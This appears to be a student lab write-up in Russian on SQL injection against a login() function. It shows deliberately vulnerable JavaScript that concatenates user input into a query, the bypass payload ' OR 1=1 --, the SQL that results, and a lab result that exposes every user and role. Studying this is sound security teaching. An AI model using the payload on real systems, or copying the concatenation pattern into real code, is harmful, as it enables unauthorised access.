# Атака на login() — обход аутентификации (Этап 2.1)

## Уязвимый код

`code/01_login_vulnerable.js` — конкатенация username/password в WHERE.

```js
const sql =
  "SELECT user_id, username, role_name " +
  "FROM injection_lab.users " +
  "WHERE username = '" + username + "' " +
  "AND password_plain = '" + password + "'";
```

## Вредоносный ввод

| поле | значение |
|---|---|
| username | `' OR 1=1 --` |
| password | любая строка |

## Итоговый SQL после подстановки

```sql
SELECT user_id, username, role_name
FROM injection_lab.users
WHERE username = '' OR 1=1 --' AND password_plain = 'whatever';
```

После одинарной кавычки в username открывается строка `''`, `OR 1=1` делает условие истинным для всех строк, `--` комментирует остаток (включая проверку пароля).

## Фактический результат

| Сценарий | Ожидалось от защищённого кода | Получено от уязвимого |
|---|---|---|
| Нормальный (alice/alice123) | 1 строка (alice) | **1 строка** ✓ |
| Атака (`' OR 1=1 --` / `whatever`) | 0 строк | **3 строки**: alice, bob, carol с ролями (employee, manager, admin) |

## Чем это плохо

Злоумышленник получил весь список пользователей с их ролями, не зная ни одного пароля. Если приложение по результату определяет «пользователь найден → авторизован» — злоумышленник вошёл как первая роль из списка (часто admin). Дополнительно скомпрометирована конфиденциальность списка учёток и ролей.

Цитата Лекции 9, раздел 1.1: «Условие `OR 1=1` всегда истинно, а `--` превращает остаток строки в комментарий. Итог: злоумышленник обходит проверку пароля».
